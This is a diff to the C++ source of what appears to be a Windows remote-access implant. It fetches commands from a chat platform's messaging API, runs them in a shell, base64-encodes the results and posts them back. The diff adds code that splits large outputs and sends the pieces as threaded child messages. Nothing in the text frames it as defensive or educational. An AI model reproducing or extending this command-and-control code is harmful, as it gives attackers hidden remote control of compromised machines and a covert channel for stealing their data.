@@ -212,8 +212,8 @@ int SendTheMessage(const char* message, LPSTR& id) {
 // - output: Reference to the pointer that will store the output of the command execution.
 // Returns:
 // - 0 if the message is successfully retrieved and command execution is performed, 1 otherwise.
-int RecvTheMessage(const char* id, LPSTR &output) {
-    
+int RecvTheMessage(const char* id, LPSTR& output) {
+
     CHAR endpoint[5000];
     LPSTR firstHalf = (LPSTR)"/v2/chat/users/me/messages/";
     LPSTR secondHalf = (LPSTR)"?to_channel=";
@@ -222,11 +222,11 @@ int RecvTheMessage(const char* id, LPSTR &output) {
     lstrcatA(endpoint, id);
     lstrcatA(endpoint, secondHalf);
     lstrcatA(endpoint, channel);
-    
+
     HINTERNET hRequest;
-    
+
     SendRequest(hRequest, "GET", endpoint, "");
-    
+
     const int bufferSize = 4096;
     ULONG atBuffSize = 1 << 13;
     SIZE_T responseSize = (SIZE_T)atBuffSize;
@@ -238,7 +238,7 @@ int RecvTheMessage(const char* id, LPSTR &output) {
     while (bKeepReading && bytesRead != 0) {
         bKeepReading = InternetReadFile(hRequest, response, bufferSize, &bytesRead);
     }
-    
+
     LPSTR messageStart = NULL;
     messageStart = (LPSTR)response;
     messageStart += 56;
@@ -350,13 +350,34 @@ int RecvTheMessage(const char* id, LPSTR &output) {
 
                 LPVOID mainBuffer = VirtualAlloc(0, inBufferSize, MEM_COMMIT, PAGE_READWRITE);
                 memset(mainBuffer, 0, outBuffSize);
-
                 pipeOUT = execute_shell_commands((char*)mainCommand);
-                ReadFromPipe((char*)mainBuffer, pipeOUT);
+                DWORD bytesRead = ReadFromPipe((char*)mainBuffer, pipeOUT);
                 LPSTR data_output = LPSTR(mainBuffer);
                 size_t input_size = strlen(data_output);
                 const char* encoded_data = base64_encode(data_output, input_size, &input_size);
                 output = (LPSTR)encoded_data;
+
+
+                if (input_size > 4087) {
+                    int numVariables = 0;
+                    char** variables = SplitDataFromPipe((char*)output, (DWORD)input_size, &numVariables);
+
+                    LPSTR MsgParentID;
+                    SendTheMessage("Huge Output", MsgParentID);
+                    SleepEx((DWORD)2000, FALSE);
+                    for (int i = 0; i < numVariables; i++) {
+                        LPSTR mResult = AddPrefixToResult(variables[i], (LPSTR)"result: ");
+
+                        LPSTR _ID;
+                        SendChildMessage(mResult, _ID, MsgParentID);
+
+                        free(variables[i]);
+                    }
+
+                    free(variables);
+                    output = (LPSTR)"Huge Output Send!";
+                }
+                else { }
             }
         }
 
@@ -371,6 +392,53 @@ int RecvTheMessage(const char* id, LPSTR &output) {
     else {
         output = (LPSTR)"";
     }
-    
     return 0;
+}
+
+LPSTR AddPrefixToResult(LPSTR str, LPSTR prefix) {
+    size_t prefixLength = strlen(prefix);
+    size_t strLength = strlen(str);
+    size_t newLength = prefixLength + strLength + 1;
+
+    LPSTR newStr = (LPSTR)malloc(newLength);
+
+    strcpy_s(newStr, newLength, prefix);
+    strcat_s(newStr, newLength, str);
+
+    return newStr;
+}
+
+
+int SendChildMessage(const char* message, LPSTR& id, LPSTR ParentMsgID) {
+    const char* endpoint = "/v2/chat/users/me/messages";
+
+    LPSTR tempRequestData = ReplaceChildParameters(message, channel, ParentMsgID);  // Replace any parameters in the message content
+    char* requestData = replaceBackslashes(tempRequestData);  // Replace backslashes in the request data
+
+    HINTERNET hRequest;
+    SendRequest(hRequest, "POST", endpoint, requestData);  // Send a POST request to send the message
+
+    // Read the response
+    const int bufferSize = 4096;
+    ULONG atBuffSize = 1 << 13;
+    SIZE_T responseSize = (SIZE_T)atBuffSize;
+    PVOID response = VirtualAlloc(0, responseSize, MEM_COMMIT, PAGE_READWRITE);
+    memset(response, 0, responseSize);
+    DWORD bytesRead = -1;
+    BOOL bKeepReading = TRUE;
+
+    while (bKeepReading && bytesRead != 0) {
+        bKeepReading = InternetReadFile(hRequest, response, bufferSize, &bytesRead);
+    }
+
+    if (strncmp((const char*)response, "{\"code\":124", 11) == 0) {
+        printf("Invalid access token.");
+        ExitProcess(0);
+    }
+
+    id = (LPSTR)response;
+    id += 7;
+    id[strlen(id) - 2] = '\0';  // Extract the message ID from the response
+
+    return 0;  // Return 0 if the message is successfully sent
 }
